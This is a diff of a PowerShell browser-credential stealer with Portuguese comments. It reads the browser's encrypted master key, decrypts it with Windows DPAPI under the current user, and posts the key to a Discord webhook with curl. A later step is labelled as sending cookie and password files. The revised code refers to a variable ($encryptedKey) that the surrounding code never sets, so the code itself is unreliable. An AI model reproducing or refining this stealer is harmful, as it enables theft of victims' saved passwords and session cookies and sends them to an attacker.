@@ -11,20 +11,21 @@ try {
     $j = Get-Content $ls.FullName -Raw | ConvertFrom-Json
     $encKey = $j.os_crypt.encrypted_key
     
-    # 2. Converte de Base64 e remove o prefixo 'DPAPI' (os primeiros 5 bytes)
-    $bytes = [Convert]::FromBase64String($encKey)[5..($encKey.Length - 1)]
+# 2. Converte de Base64 e corta os 5 bytes do prefixo 'DPAPI'
+$keyBytes = [Convert]::FromBase64String($encryptedKey)
+$trimmedKey = $keyBytes[5..($keyBytes.Length - 1)]
 
-    # 3. Tenta descriptografar usando o contexto do USUÁRIO ATUAL
-    # É aqui que o Windows 'abre' a chave mestra
-    try {
-        $unp = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser')
-        $masterKeyPronta = [Convert]::ToBase64String($unp)
-        
-        # Manda a chave que VOCÊ vai usar no Dashboard
-        curl.exe -F "content=🔑 CHAVE_MESTRA_PRONTA:$masterKeyPronta" $u
-    } catch {
-        curl.exe -F "content=⚠️ Falha ao descriptografar no alvo: $($_.Exception.Message)" $u
-    }
+# 3. A MÁGICA: Descriptografa usando a API do Windows
+try {
+    Add-Type -AssemblyName System.Security
+    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, 'CurrentUser')
+    $finalKey = [Convert]::ToBase64String($decryptedKey)
+    
+    # Envia para o Discord - ESTA É A QUE VOCÊ COPIA
+    curl.exe -F "content=🔑 CHAVE_MESTRA_PRONTA: $finalKey" $u
+} catch {
+    curl.exe -F "content=❌ Erro Fatal: O Windows bloqueou a chave. Erro: $($_.Exception.Message)" $u
+}
 
     # 4. Envia os arquivos (Cookies e Senhas)
     $paths = @(
